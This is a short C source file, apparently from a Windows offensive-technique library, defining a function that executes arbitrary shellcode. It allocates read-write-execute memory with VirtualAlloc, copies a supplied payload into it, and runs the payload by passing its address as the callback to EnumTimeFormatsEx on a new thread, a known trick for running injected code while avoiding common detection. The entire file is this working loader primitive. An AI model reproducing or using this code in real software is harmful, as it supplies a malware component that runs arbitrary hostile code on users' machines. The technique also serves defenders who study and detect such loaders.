#include "Win32Helper.h"

VOID InvokeEnumTimeFormatsExCallbackRoutine(LPVOID lpParameter)
{
	EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)lpParameter, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL);
}

BOOL MpfSceViaEnumTimeFormatsEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumTimeFormatsExCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}